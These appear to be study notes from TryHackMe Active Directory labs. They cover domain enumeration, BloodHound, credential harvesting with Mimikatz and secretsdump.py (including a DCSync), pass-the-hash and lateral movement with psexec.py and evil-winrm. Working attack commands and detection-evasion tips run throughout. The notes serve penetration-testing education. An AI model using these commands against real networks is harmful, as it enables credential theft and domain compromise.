**Mitigations:** enforce pre-authentication domain-wide, strong/complex passwords (slows offline cracking), monitor anomalous AS-REP request patterns on the KDC.

> [!summary] Quick Recap — AS-REP Roasting
> 
> - No service-account requirement — the only precondition is `UF_DONT_REQUIRE_PREAUTH` on any user account
> - Pre-auth disabled means the KDC skips identity verification entirely and hands back a crackable blob to any requester
> - `GetNPUsers.py` (Linux-friendly) needs a username list; Rubeus (Windows) can auto-enumerate without one
> - `hashcat -m 18200` is the specific mode — distinct from Kerberoasting's `-m 13100`

---

#### Manual Enumeration (Living Off the Land)

**Why native tools:** CMD/PowerShell built-ins are present on every Windows system, require no extra tooling transfer, and **blend in with ordinary admin activity** — the Living Off the Land (LOTL) approach, used by real adversaries for exactly this reason.

**Who am I? — the foundational first question:**

```cmd
whoami
```

`DomainName\DomainUser` format = domain account; `ComputerName\LocalUser` = local account.

```cmd
whoami /all
```

Returns SID, full group memberships, and account privileges in one pass — the single most information-dense starting command.

**High-value privileges to specifically check for in that output:**

|Privilege|Why It Matters|
|---|---|
|`SeImpersonatePrivilege`|Impersonate another authenticated user's security context — the basis of "potato" family attacks|
|`SeAssignPrimaryTokenPrivilege`|Assign another user's primary token to a new process — used alongside SeImpersonatePrivilege|
|`SeBackupPrivilege`|Read **any** file regardless of permissions — enables SAM/SYSTEM hive dumping|
|`SeRestorePrivilege`|Write to **any** file/registry key regardless of permissions — enables overwriting critical system state|
|`SeDebugPrivilege`|Attach a debugger to any process — enables LSASS memory dumping for credential extraction|

> [!warning] A domain-admin-level account logged into a low-value box is a configuration red flag, not a target to assume Landing directly in a `Domain Admins` account typically signals a genuinely insecurely-configured target — worth noting as a finding in itself, not just an opportunity.

**System and domain information:**

```cmd
hostname                                  # hostname itself — naming conventions often hint at role (dc, pc01, etc.)
systeminfo                                # OS version, hotfixes, domain/workgroup — needs admin privileges
systeminfo | findstr /B "OS"               # filter to OS info
systeminfo | findstr /B "Domain"           # filter to domain membership
set                                        # environment variables (PowerShell: Get-ChildItem Env: or dir env:)
```

> [!note] `USERDOMAIN` reveals domain membership indirectly `USERDOMAIN` equals the computer name unless the machine is actually domain-joined — a quick environment-variable check for domain status without running `systeminfo`.

**Enumerating users and groups with `net` (CMD):**

```cmd
net help                               # full command list
net user /domain                        # all domain users (vs. "net user" = local accounts only)
net user <username> /domain              # full detail on one account — status, password age, group memberships, last logon
net group /domain                        # all domain groups
net group "<Group Name>" /domain         # members of a specific group (incl. machine accounts in Domain Computers)
net localgroup                           # local groups
net localgroup Administrators            # members of a specific local group
```

**Groups worth specifically checking:** Domain Admins, Administrators, Enterprise Admins (multi-domain forest context), Server Operators, Backup Operators, and **any group with "Admin" in its name** regardless of how custom it looks.

> [!note] Machine accounts are identifiable by a trailing `$` `net group "Domain Computers" /domain` returns computer accounts named like `DESKTOP-ACCT05$` — the `$` suffix is the consistent machine-account marker, same convention covered in the AD Basics room.

**Logged-on users and active sessions — "who else is here?":**

```cmd
quser                                    # query user, shorthand for query user — active/locked sessions, logon time
tasklist                                 # running processes; tasklist /V for verbose
net session                              # SMB sessions to/from this host — requires admin privileges
```

> [!warning] A logged-in admin session is a high-value sighting An administrator logged on (console or RDP) is a strong signal their credentials or Kerberos ticket may be recoverable from memory — LSASS dumping, or token impersonation if the current account holds `SeImpersonatePrivilege`, are the direct follow-ups this finding points toward.

Users who've logged in at least once (even if not currently) can be identified via individual folders under `C:\Users\`.

**Identifying service accounts:**

Service accounts run applications/services, typically with just-enough privilege (though "just enough" can still be significant), and carry **static, rarely-rotated passwords** — a password change risks breaking whatever depends on that account, so admins avoid it, making these accounts persistently weak over time.

```cmd
wmic service get Name,StartName                              # requires admin
sc query state= all                                            # all services, requires admin
sc qc <ServiceName>                                             # specific service config, reveals SERVICE_START_NAME
```

PowerShell equivalent:

```powershell
Get-WmiObject Win32_Service | select Name, StartName
```

**Standard `StartName` values:** `LocalSystem`, `NT AUTHORITY\LocalService`, `NT AUTHORITY\NetworkService`, `NT SERVICE\SomeServiceName` (virtual service accounts). **A domain account (`DomainName\username`) running a service is specifically worth investigating** — potential credential reuse elsewhere, or a password that may not actually meet the domain's normal complexity policy.

**Registry and environment variables — persistent configuration worth checking:**

**Saved auto-logon credentials:**

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

Misconfigured/test systems sometimes store this in **plaintext**. `HKLM\Security\Cache` is a related, admin-privilege-gated location holding hashed (crackable) cached credentials instead.

**Installed applications:**

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
```

Useful for spotting software with known default credentials, without needing Control Panel GUI access.

**General keyword search:**

```cmd
reg query HKLM /f "password" /t REG_SZ /s
```

**Scheduled tasks:**

```cmd
schtasks /query                          # list all
schtasks /create ...                      # create new
schtasks /run ...                         # run an existing task
```

> [!summary] Quick Recap — Manual Enumeration
> 
> - `whoami /all` is the single densest starting command — SID, groups, and privileges in one output
> - `SeImpersonate`/`SeAssignPrimaryToken`/`SeBackup`/`SeRestore`/`SeDebug` privileges are the five worth actively scanning for in that output — each maps to a specific, well-known escalation technique
> - `net user/group /domain` covers the bulk of CMD-native domain enumeration — no extra tooling needed, and it blends with normal admin activity
> - A domain account (not a built-in service identity) running a Windows service is a specific, named red flag — check it for reuse/weak passwords
> - Registry auto-logon credentials, when present, are frequently plaintext — a single `reg query` away from a real credential

---

#### Enumeration with BloodHound

**The paradigm shift:** "Defenders think in lists. Attackers think in graphs." (John Lambert). Traditional defense works with static lists (a list of Domain Admins, a list of servers); BloodHound maps the **hidden relationships** between users/groups/computers — permissions, sessions, delegation, trust — as a graph, revealing attack paths invisible to list-based thinking.

**The two-stage attack model BloodHound enables:**

1. **Enumeration** — data collectors (SharpHound, BloodHound.py) gather AD structure: sessions, group memberships, ACLs, delegation settings. Even if detected early, the attacker already has enough offline data to build the full attack graph
2. **Targeted attack** — analysis happens **offline**, identifying the precise, efficient path to the goal (e.g. Domain Admin). Re-entering the live environment means moving and escalating within minutes — often faster than defenders can respond to the very first collection alert

**Modern capabilities:** AzureHound extends coverage to Azure Entra ID alongside on-prem AD; new attack primitives detect techniques like Resource-Based Constrained Delegation (`AddAllowedToAct`/`AllowedToAct`); the Butterfly algorithm improves risk scoring/prioritisation for understanding relationship impact.

**SharpHound vs. BloodHound — not the same thing:** SharpHound is the **data collector**; BloodHound is the **visualisation/analysis tool** that ingests what SharpHound (or an equivalent collector) gathers.

**SharpHound collector types:**

- **`SharpHound.exe`** — Windows executable, standard domain-joined enumeration, currently the recommended method
- **`AzureHound.ps1`** — Azure Entra ID-specific
- **`SharpHound.ps1`** (deprecated) — formerly used for in-memory stealth loading, discontinued in favour of the exe/Python options

**`BloodHound.py`** — Python collector for Linux-based operation, supports credential/NTLM hash/Kerberos ticket auth, outputs JSON or ZIP. **Unofficially supported** by the BloodHound team (community-maintained).

> [!warning] Version matching matters BloodHound and SharpHound versions must match — BloodHound updates frequently break ingestion of older SharpHound output.

**Running SharpHound on Windows:**

```cmd
.\SharpHound.exe --CollectionMethods All --Domain tryhackme.loc --ExcludeDCs
```

- `--CollectionMethods All` — every available collection method
- `--ExcludeDCs` — skip domain controllers, reducing detection risk

> [!warning] SharpHound.exe is a common Defender trigger The binary itself can be blocked by Windows Defender — worth anticipating before relying on it mid-engagement.

**Running BloodHound.py on Linux:**

```bash
bloodhound-python -u asrepuser1 -p qwerty123! -d tryhackme.loc -ns 10.211.12.10 -c All --zip
```

- `-ns` — DNS server IP
- `-c All` — all collection methods
- `--zip` — compress output for direct import

> [!note] Kerberos fallback is normal, not an error A "Failed to get Kerberos TGT... Falling back to NTLM" warning is expected when DNS/Kerberos resolution isn't fully configured — the tool proceeds via NTLM authentication automatically.

**Operational security considerations:**

- `--ExcludeDCs` avoids querying domain controllers directly
- Stealthier collection methods (e.g. `DCOnly`) limit interaction with sensitive systems
- Running from a system with appropriate AV exclusions, or a non-domain-joined machine authenticating via `runas /netonly`, reduces footprint

**Using BloodHound-CE (web-based):**

1. Navigate to the BloodHound-CE server (`http://10.211.12.100:8080` in this lab)
2. Log in (`admin` / provided password)
3. **Administration → File Ingest** → upload the generated ZIP
4. **Explore** tab for the visual graph: **nodes** (users/computers/groups), **edges** (relationships/permissions)

**Node information breakdown, once a node is selected:** Object information (name/type/domain), Sessions (active logons), Member of (groups), Local admin privileges (machines with local admin rights), Execution privileges (RDP/equivalent), Outbound object control (rights this object has over others), Inbound object control (rights others have over this object).

**Built-in queries:** **Cypher** tab → folder icon → prebuilt queries (e.g. "All Domain Admins") — no manual query-writing needed for common questions.

**Attack path discovery (Pathfinding):** set a Start Node and End Node (e.g. a specific compromised user → `Tier 1 ADMINS`), run with chosen edge filters — BloodHound visually maps any existing path. No path found can mean genuinely no path, or incomplete collection data.

**Benefits/limitations:** web-based UI, clear visual path mapping, deep relationship insight — but **SharpHound collection itself is noisy and can trigger AV/EDR alerts.**

> [!summary] Quick Recap — BloodHound
> 
> - The core insight: attackers think in graphs (relationships), defenders traditionally think in lists — BloodHound closes that gap for both sides
> - SharpHound (collector) ≠ BloodHound (analysis/visualisation) — two distinct tools in the pipeline, version-matched
> - `.exe` (Windows, recommended) and `BloodHound.py` (Linux, unofficial) are the two practical collection paths
> - The two-stage model (collect once, even if detected → analyse offline → execute fast) is what makes BloodHound operationally dangerous even against a responsive blue team
> - Collection itself is the noisy, detectable phase — `--ExcludeDCs` and `DCOnly` reduce but don't eliminate that signature

---

#### Enumeration with PowerShell's ActiveDirectory and PowerView Modules

#### The `ActiveDirectory` Module

Available natively on DCs; elsewhere requires RSAT (Remote Server Administration Tools), or a standalone module install without the full RSAT suite.

```powershell
Get-Module -ListAvailable ActiveDirectory    # check availability
Import-Module ActiveDirectory                 # load it
```

**User enumeration:**

```powershell
Get-ADUser -Filter *                                                              # all users
Get-ADUser -Identity <username>                                                    # single user, basic fields
Get-ADUser -Identity <username> -Properties *                                       # single user, every property
Get-ADUser -Identity <username> -Properties LastLogonDate,MemberOf,Title,Description,PwdLastSet   # targeted fields
Get-ADUser -Filter "Name -like '*admin*'"                                           # filtered search
```

**Notably useful fields:** `LastLogonDate` (idle account detection), `MemberOf` (group memberships), `Description` (sometimes contains leaked info), `Title` (job role context).

**Group enumeration:**

```powershell
Get-ADGroup -Filter *                              # all groups
Get-ADGroup -Filter * | Select Name                 # names only
Get-ADGroupMember -Identity "Group Name"             # members of a specific group
```

**Computer enumeration:**

```powershell
Get-ADComputer -Filter *
Get-ADComputer -Filter * | Select Name, OperatingSystem
```

**Policy enumeration:**

```powershell
Get-ADDefaultDomainPasswordPolicy
```

Returns complexity requirements, lockout threshold/duration, min/max password age, history count — directly feeding into a password-spraying strategy, same as the earlier room's `--pass-pol`/`getdompwinfo` checks, but from an authenticated PowerShell context.

#### PowerView (PowerSploit Framework)

**What it is:** a PowerShell domain enumeration tool — functionally an evolution of `net user`/`net group`, with far richer filtering, formatting, and property access. Part of the broader PowerSploit framework (also includes AntivirusBypass, CodeExecution, Exfiltration, Persistence, Privesc, and more — `Recon` is where PowerView specifically lives).

```powershell
Import-Module .\PowerView.ps1   # from the Recon directory; no error output = success
```

**User enumeration:**

```powershell
Get-DomainUser                 # all domain users, extremely detailed per-object output
Get-DomainUser *admin*           # filtered by name pattern
```

> [!note] PowerView's output depth vs. `net user` `net user /domain` gives a flat username list only; `Get-DomainUser` returns dozens of AD attributes per account directly — a genuinely different level of detail without needing follow-up commands per user.

**Group enumeration:**

```powershell
Get-DomainGroup                  # (alias: Get-NetGroup)
Get-DomainGroup "*admin*"         # filtered
```

Unlike `net group /domain` (requires a second command per group for membership), `Get-DomainGroup` can return membership detail directly in the same call.

**Computer enumeration:**

```powershell
Get-DomainComputer                # (alias: Get-NetComputer)
```

**High-value targeted queries:**

```powershell
Get-DomainUser -AdminCount     # users with admin-count flag set — admin-equivalent accounts
Get-DomainUser -SPN             # accounts with a registered SPN — direct Kerberoasting candidate list
```

> [!note] `-SPN` is a direct bridge to Kerberoasting `Get-DomainUser -SPN` surfaces exactly the accounts worth targeting with a Kerberoasting attack (covered in the Intro to AD Authentication room) — PowerView's enumeration output feeds directly into the next attack phase, not just situational awareness.

> [!summary] Quick Recap — ActiveDirectory Module & PowerView
> 
> - `ActiveDirectory` module: native on DCs, needs RSAT elsewhere — `Get-ADUser`/`Get-ADGroup`/`Get-ADComputer` with `-Filter`/`-Properties` give far richer output than `net` commands
> - `Get-ADDefaultDomainPasswordPolicy` is the PowerShell-native equivalent of the earlier room's `--pass-pol` check
> - PowerView (`Get-DomainUser`/`Get-DomainGroup`/`Get-DomainComputer`) returns dramatically more detail per object than `net` commands, in a single call rather than requiring per-object follow-ups
> - `Get-DomainUser -SPN` is a direct, immediately actionable Kerberoasting target list — enumeration output flowing straight into the next attack

---

> [!summary] Full AD Authenticated Enumeration Room — One Glance
> 
> - AS-REP Roasting: `UF_DONT_REQUIRE_PREAUTH` on any account (no service-account requirement) leaks a crackable AS-REP blob — `GetNPUsers.py` + `hashcat -m 18200`
> - Manual LOTL enumeration (`whoami /all`, `net user/group /domain`, `quser`, `wmic service get`, registry queries) blends with normal admin activity and needs zero additional tooling — the five high-value privileges (Impersonate/AssignPrimaryToken/Backup/Restore/Debug) are worth scanning for by name every time
> - BloodHound shifts enumeration from list-based thinking to graph-based attack-path discovery — SharpHound/BloodHound.py collect, BloodHound-CE visualises and finds paths offline, enabling fast post-detection execution
> - `ActiveDirectory` module and PowerView both vastly outperform `net` commands for depth and filtering — PowerView specifically bridges enumeration directly into exploitation via queries like `-SPN` (Kerberoasting) and `-AdminCount` (privileged account identification)
> - This room completes the authenticated half of the enumeration arc that began unauthenticated in AD: Basic Enumeration — the next logical step is acting on what's been mapped: credential harvesting and lateral movement, covered in the rooms that follow
### Intro to Credential Harvesting

> [!info] Room context Local Administrator access on a domain-joined workstation (WRK) → domain admin shell on the DC, purely through credential harvesting — no exploits, no privilege escalation vulnerabilities. Windows holds onto a surprising amount of credential material by design; this room maps where it lives and extracts it with Mimikatz and Impacket's `secretsdump.py`. Lab: `TRYHACKME.LOC`, `WRK` (10.220.10.20), `DC` (10.220.10.10).

#### Windows and Active Directory Credential Stores

**Five distinct stores, each with a different purpose, access method, and privilege requirement:**

|Store|What It Holds|Why It Exists|Access Method|Tools|
|---|---|---|---|---|
|**LSASS Memory**|NTLM hashes, Kerberos tickets, sometimes cleartext|Enables seamless SSO across services|Dump live `lsass.exe` memory|Mimikatz `sekurlsa::logonpasswords`/`sekurlsa::minidump`|
|**SAM + SYSTEM Hives**|Local account hashes|Authentication for local logons (e.g. local admin)|Export registry hives, extract with boot key|Mimikatz `lsadump::sam`, `vssadmin`|
|**LSA Secrets**|Cached domain creds, plaintext service creds|Offline logon support, scheduled task passwords, RDP secrets|RPC via LSARPC named pipe|`secretsdump.py` with local admin creds|
|**DPAPI Vault**|Saved app passwords (RDP, browsers, WiFi)|User-level secure credential storage|User token or decrypted master key|Mimikatz `vault::list`/`vault::cred /export`|
|**NTDS.dit** (DC only)|Full domain DB: usernames, NTLM + Kerberos keys|Domain authentication and replication|Replicate via MS-DRSR, or parse offline|`secretsdump.py -just-dc`, Mimikatz `lsadump::dcsync`|

**LSASS Memory** — the Local Security Authority Subsystem Service enforces security policy and manages authentication, actively holding NTLM/LM hashes, Kerberos tickets (TGTs + service tickets), and occasionally plaintext credentials **live in memory** to support SSO. SYSTEM-level access lets an attacker dump this process memory directly — a top target precisely because the data is dynamic and current, not stale.

**SAM + SYSTEM Hives** — SAM holds **encrypted** local account password hashes; decryption requires the **BootKey**, derived from the SYSTEM hive. Physical locations: `%SystemRoot%\system32\config\SAM` and `...\SYSTEM`. Extraction typically needs SYSTEM privileges — registry export, Volume Shadow Copy, or direct file access while the OS is offline.

**LSA Secrets** (`HKLM\SECURITY\Policy\Secrets`) — cached domain credentials for offline logon, cleartext service/scheduled-task passwords, sometimes RDP session passwords. **Often plaintext or trivially decrypted**, making this a high-value target — SYSTEM or Admin access required via LSARPC or specialised tooling.

**DPAPI Vault** — Windows' built-in per-user cryptographic service. A per-user master key (encrypted with a key derived from the user's **Windows password**) protects stored secrets like saved WiFi/browser credentials, stored under `%APPDATA%\Microsoft\Protect`. **Possessing both the master key and the user's logon password** is what unlocks decryption of everything in their vault.

**NTDS.dit** — the core AD database, present **only on domain controllers**. Holds every domain user/computer object, SPNs, NTLM hashes, and Kerberos key material. **The single highest-value credential store in any domain environment** — obtaining it means impersonating any domain user or service, full stop.

> [!summary] Quick Recap — Credential Stores
> 
> - Five stores, each tied to a different Windows feature: LSASS (SSO), SAM+SYSTEM (local auth), LSA Secrets (offline logon/service creds), DPAPI (per-user app secrets), NTDS.dit (domain-wide auth)
> - NTDS.dit is the single highest-value target in any domain — it IS the domain's authentication authority
> - Most of these require SYSTEM or local Administrator privilege to access at all — this room's starting position (local admin on WRK) is the deliberate precondition

---

#### Credential Extraction with Mimikatz

**What it does:** reads LSASS memory, parses SAM/SYSTEM registry hives, and decodes DPAPI vault blobs — all through direct Windows API interaction.

> [!note] This lab disables Windows Defender deliberately Mimikatz is heavily signature-flagged by AV — the lab environment disables Defender specifically so the techniques can be demonstrated cleanly. In a real engagement this would need active evasion consideration, not a given.

**DPAPI Vault extraction:**

```
mimikatz # vault::list
```

Lists available vaults (Windows Credentials, Web Credentials) and their contents.

```
mimikatz # vault::cred /export
```

```
TargetName : WRK / <NULL>
UserName   : TRYHACKME\svc-app
Type       : 2 - domain_password

TargetName : gmail.com / <NULL>
UserName   : ElonTusk
Type       : 1 - generic
Credential : *******
```

> [!warning] Local admin unlocks some vaults, not all Local Administrator file-level access to user profile directories is enough to decrypt **the local user's own** DPAPI-protected secrets (ElonTusk's web credentials, in this example) — often without even needing `privilege::debug`. But a **service account's** vault (svc-app) is protected by DPAPI keys tied specifically to _that account's_ own user context — without running/impersonating as svc-app or having their password/token, those secrets stay encrypted even with full local admin rights. **Local admin is not a universal DPAPI master key.**

**SAM + SYSTEM hive extraction** — recovers local account NTLM hashes directly, even for accounts that haven't logged in recently.

Export the hives first (PowerShell, as Administrator):

```powershell
reg save HKLM\SAM C:\Users\Administrator\Desktop\SAM
reg save HKLM\SYSTEM C:\Users\Administrator\Desktop\SYSTEM
```

Then in Mimikatz:

```
mimikatz # lsadump::sam /sam:"C:\Users\Administrator\Desktop\SAM" /system:"C:\Users\Administrator\Desktop\SYSTEM"
```

```
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 568a741b56c79622cc3f4c83720bf45e
```

**Extracting from LSASS memory directly:**

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

- `privilege::debug` — enables `SeDebugPrivilege`, required to read/manipulate process memory for the LSASS dump
- `sekurlsa::logonpasswords` — dumps all current logon sessions' credential structures: usernames, domains, NTLM/SHA1 hashes, and any cleartext found in memory

> [!note] LSASS only holds what's actively (or recently) logged in No domain user credentials appeared in this room's LSASS dump specifically because no domain user had an active session on WRK at the time — LSASS doesn't retain credentials for sessions that have already ended, regardless of past login history. This is a fundamentally different limitation from the SAM/LSA Secrets stores, which persist independent of current session state.

**LSA Secrets (cached domain credentials):**

```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::cache
```

- `token::elevate` — steals the SYSTEM token, running Mimikatz as the highest local privilege level
- `lsadump::cache` — reads the on-disk MSCacheV2 (DCC2) cache — hashed domain-user logon secrets retained specifically to support offline authentication

```
RID       : 000001f4 (500)
User      : TRYHACKME\Administrator
MsCacheV2 : ******************
```

**Outcome of this task's chain:** plaintext credentials for domain user `svc-app` and web credentials for local user `ElonTusk` — both directly reusable for lateral movement or added to a password-spraying candidate list.

> [!summary] Quick Recap — Mimikatz Extraction
> 
> - `vault::list`/`vault::cred /export` for DPAPI — local admin unlocks the local user's own secrets, but NOT a service account's vault without impersonating that specific account
> - SAM+SYSTEM hive extraction recovers local hashes regardless of recent login activity — a persistent store, unlike LSASS
> - `privilege::debug` + `sekurlsa::logonpasswords` reads LSASS — but only yields credentials for currently (or very recently) active sessions
> - `token::elevate` to SYSTEM + `lsadump::cache` recovers DCC2 cached domain credentials — a separate, persistent store from LSASS's live-session-only data

---

#### Credential Harvesting with `secretsdump.py`

**Why this approach matters:** extracts secrets **remotely over SMB/DCE-RPC**, using Windows' own built-in functionality — no binary upload, no direct file touching. Stealthier and more operationally practical than running Mimikatz locally on every target.

**Dumping local + cached domain hashes with local admin creds, from the AttackBox:**

```bash
secretsdump.py WRK/Administrator:N3w34829DJdd?1@10.220.10.20 -output local_dump
```

Output includes both **local SAM hashes** (uid:rid:lmhash:nthash format) and **cached domain logon info** (DCC2/MSCacheV2 hashes):

```
TRYHACKME.LOC/drgonzo:$DCC2$10240#drgonzo#a98704b0d7273fba939be51549f9782a
```

> [!warning] DCC2 hashes are NOT Pass-the-Hash candidates Unlike NTLM hashes, DCC2 (MS-Cache v2) hashes can only be **cracked offline** — they cannot be replayed directly for authentication. They exist specifically to support offline domain logon, which is also exactly why they can't be used the way a live NTLM hash can.

**Cracking a DCC2 hash:**

```bash
john --format=mscash2 dc2_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

`--format=mscash2` — the specific John format for DCC2/MS-Cache v2 hashes.

> [!note] A cracked domain-user password isn't automatically full domain access Recovering `drgonzo`'s password allows RDP login to the DC — but that alone doesn't grant read access to the Domain Admin's Desktop flag. The cracked credential is a **stepping stone**, not the end state — this is exactly why the chain continues to a full DCSync next.

**Dumping the full domain database once domain admin credentials are held:**

```bash
secretsdump.py TRYHACKME/drgonzo:*******@10.220.10.10 -just-dc -output dc_dump
```

> [!warning] `-just-dc` performs a real DCSync attack `-just-dc` skips local SAM/LSA hive dumping and performs the **DRSUAPI ("DCSync") extraction** of the domain's `NTDS.dit` instead — abusing the legitimate inter-DC replication protocol that lets a second domain controller sync credentials from the primary. **This requires domain admin-equivalent replication rights** — it works here specifically because `drgonzo`'s cracked credential turned out to carry that level of access.

Output: every domain account's NTLM hash + Kerberos keys, in `username:RID:LM_hash:NT_hash:::` format — including `krbtgt`, every user account, and every machine account (`DC$`, `WRK$`).

**Using a recovered NTLM hash directly — Pass-the-Hash, no plaintext needed:**

```bash
psexec.py 'TRYHACKME/Administrator@10.220.10.10' -hashes :****************
```

```
C:\Windows\system32> whoami
nt authority\system
```

**The full chain, traced:** local admin on WRK → Mimikatz/secretsdump reveals `svc-app` plaintext + DCC2 hashes → crack `drgonzo`'s DCC2 hash offline → use `drgonzo`'s cracked credentials for a DCSync against the DC → full NTDS.dit dump including the Administrator's NTLM hash → Pass-the-Hash via `psexec.py` → **`nt authority\system` on the domain controller.**

> [!summary] Quick Recap — secretsdump.py
> 
> - Remote, binary-free extraction over SMB/DCE-RPC — operationally stealthier than local Mimikatz execution
> - DCC2 hashes from `secretsdump.py` (no `-just-dc`) require offline cracking — never usable for Pass-the-Hash directly
> - `-just-dc` performs an actual DCSync attack, abusing legitimate DC replication protocol — requires the account used to already hold domain admin-equivalent replication rights
> - A recovered NTLM hash (from the DCSync) enables Pass-the-Hash via `psexec.py` directly — no plaintext password ever needed for the final step

---

> [!summary] Full Intro to Credential Harvesting Room — One Glance
> 
> - Five credential stores, each serving a distinct Windows/AD feature: LSASS (live SSO sessions), SAM+SYSTEM (local accounts), LSA Secrets (offline logon/service creds), DPAPI (per-user app secrets), NTDS.dit (the entire domain's authentication authority)
> - Mimikatz operates locally and directly: `vault::cred` for DPAPI (local-user secrets only, not service accounts), `lsadump::sam` for local hashes, `sekurlsa::logonpasswords` for live LSASS sessions, `token::elevate` + `lsadump::cache` for persistent DCC2 cached domain creds
> - `secretsdump.py` operates remotely without touching the target's disk — `-just-dc` specifically performs a DCSync, abusing legitimate DC replication rights to pull the entire domain database
> - The complete demonstrated chain — local admin → cached hash → offline crack → DCSync → Pass-the-Hash → domain SYSTEM — required zero exploits, zero privilege escalation vulnerabilities, purely credential discovery and reuse at each step
> - DCC2/MSCacheV2 hashes are offline-crack-only; NTLM hashes (from a full NTDS.dit dump) are directly Pass-the-Hash usable — knowing which hash type is in hand determines the very next move
### Intro to AD Lateral Movement

> [!info] Room context The bridge between "one compromised workstation" and "domain-wide compromise." Starting position: SSH access to `WebServer` as `jdoe`/`Summer2026!` — `jdoe` is local admin on `WRK`, a member of `Remote Management Users` (not admin) on `SERVER1`, with a harvested NTLM hash waiting to be found along the way. Full chain: remote execution → Pass-the-Hash/credential reuse → pivoting → reaching `ROOTDC`.

#### What Is Lateral Movement

**Definition:** moving from one compromised host to another using **valid credentials, hashes, or tickets** — not exploits, not password spraying. "We're not breaking down doors; we're walking through them with stolen keys."

**Why it matters:** a single compromised workstation rarely holds anything of real value on its own. Sensitive data, the DC, elevated service accounts, backup servers with domain-wide access — all live elsewhere. **The core loop:** move → harvest more credentials → move again, repeating until the objective is reached.

**The three pillars:**

|Pillar|Mechanism|Example Tools|
|---|---|---|
|**Remote Execution**|Legitimate Windows admin protocols abused with stolen creds — SMB (PsExec), WinRM, WMI/DCOM|Impacket, Evil-WinRM|
|**Credential Reuse**|Authenticating with a hash or ticket directly instead of a password|Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash|
|**Pivoting**|Using a compromised host as a relay to reach network segments otherwise unreachable|SSH tunnels/SOCKS, Chisel, Ligolo-ng|

**Two prerequisites for any lateral movement technique:**

1. **Valid credentials** — plaintext password, NTLM hash, or Kerberos ticket
2. **Administrative access on the target** — most remote execution needs local Administrators group membership (writing to `ADMIN$`, interacting with SCM); WinRM is slightly more flexible, also accepting `Remote Management Users`

> [!note] Local admin ≠ Domain Admin, but it can become the path to it Being local admin on a handful of workstations grants no domain-wide privilege on its own. But if **any** of those workstations has a Domain Admin's credentials cached from a prior session, that "low-value" local admin foothold becomes the key to the entire domain — exactly the chain this room demonstrates end to end.

> [!summary] Quick Recap — What Lateral Movement Is
> 
> - Uses legitimate authentication mechanisms with stolen material — not vulnerabilities
> - The move → harvest → move loop continues until the objective (usually the DC) is reached
> - Three pillars: remote execution, credential reuse, pivoting — each covered as its own phase in this room
> - Local admin access on a low-value host can become domain-critical the moment it yields cached higher-privilege credentials

---

#### Remote Execution Methods

**Shared requirement across most methods:** the authenticating account needs local administrator rights on the target — the underlying mechanisms (admin share writes, service creation, WMI interaction) are all admin-gated. WinRM is the one exception, also accepting `Remote Management Users`.

#### PsExec (Impacket's `psexec.py`)

**Mechanism, step by step** (understanding this is what explains both its reliability and its noisiness):

1. Authenticate over SMB (445), open `IPC$`
2. Connect to `ADMIN$` (maps to `C:\Windows\`), upload a **randomly named** service binary
3. Open a handle to the Service Control Manager via `\PIPE\svcctl`, call `CreateServiceW` — this is what generates **Event ID 7045** (new service installed)
4. `StartServiceW` executes the binary as **`LocalSystem`** — input/output redirected through named pipes
5. On exit: service stopped, deleted, binary removed from `ADMIN$`

**Why PsExec gives SYSTEM, not the authenticated user's own privileges:** the commands run in the context of the Windows **service**, which executes as `LocalSystem` regardless of which account authenticated to create it.

**Pre-flight check with NetExec before attempting PsExec:**

```bash
nxc smb 192.168.13.61 -u jdoe -p 'Summer2026!' -d thm.loc
```

The **`(Pwn3d!)`** marker confirms local admin access — PsExec will work.

**Getting the shell:**

```bash
psexec.py thm.loc/jdoe:'Summer2026!'@192.168.13.61
```

```
C:\Windows\system32> whoami
nt authority\system
```

> [!note] A compromised host is worth investigating beyond the flag With SYSTEM on WRK, checking the Administrator's Documents folder revealed `loot.txt` — a `secretsdump`-format NT hash for the local Administrator, readable _only_ because PsExec grants SYSTEM (the file is restricted to Administrator and SYSTEM, not `jdoe`'s own level). This single file becomes the entire basis of the next phase.

> [!warning] Common PsExec failure causes `ADMIN$` unreachable (445 firewalled), the account lacking local admin on target (no `(Pwn3d!)` from NetExec), or enforced SMB signing. Always pre-check with NetExec rather than troubleshooting blind.

#### Evil-WinRM

**Protocol:** Windows Remote Management over HTTP (5985) / HTTPS (5986) — the same protocol underlying PowerShell Remoting, enabled by default on Windows Server.

**Two key differences from PsExec:**

- **Shell context: the authenticated user, not SYSTEM** — privileges are exactly what that account holds, nothing more
- **Group requirement:** `BUILTIN\Administrators` **or** `BUILTIN\Remote Management Users` — more flexible than PsExec's strict `ADMIN$`-write requirement

**Also significantly quieter:** no disk writes, no service creation, no Event ID 7045 — just a standard network logon event (4624 Type 3) blending with normal admin traffic.

```bash
evil-winrm -i 192.168.13.51 -u jdoe -p 'Summer2026!'
```

```
*Evil-WinRM* PS C:\Users\jdoe\Documents> whoami
thm\jdoe
```

Running as `jdoe`, not SYSTEM — access is strictly bounded by what `jdoe` can actually read/write:

```
*Evil-WinRM* PS C:\Users\jdoe\Documents> type C:\Users\Administrator\Desktop\flag4.txt
Access is denied.
```

> [!note] This access-denial is the deliberate pivot point to the next phase `jdoe` isn't local admin on SERVER1 — WinRM access alone can't reach the Administrator's files. The room's next phase (Pass-the-Hash with the hash found on WRK) exists specifically to solve exactly this limitation.

```bash
evil-winrm -i TARGET -u Administrator -H NTLM_HASH
```

Evil-WinRM's `-H` flag makes it a direct Pass-the-Hash companion, same as Impacket tools.

#### Other Remote Execution Methods (Reference)

|Method|Tool|Mechanism|Noise|When to Use|
|---|---|---|---|---|
|WMI|`wmiexec.py`|DCOM `Win32_Process.Create`|Lower — no service install, no disk write|PsExec blocked/detected|
|DCOM|`dcomexec.py`|`MMC20.Application`/`ShellWindows` DCOM objects|Low — legitimate COM automation paths|SCM locked down, DCOM available|
|SMBExec|`smbexec.py`|Service running `cmd.exe /c`, output to temp file|Medium — still 7045, no binary on disk|AV catches the PsExec binary upload|
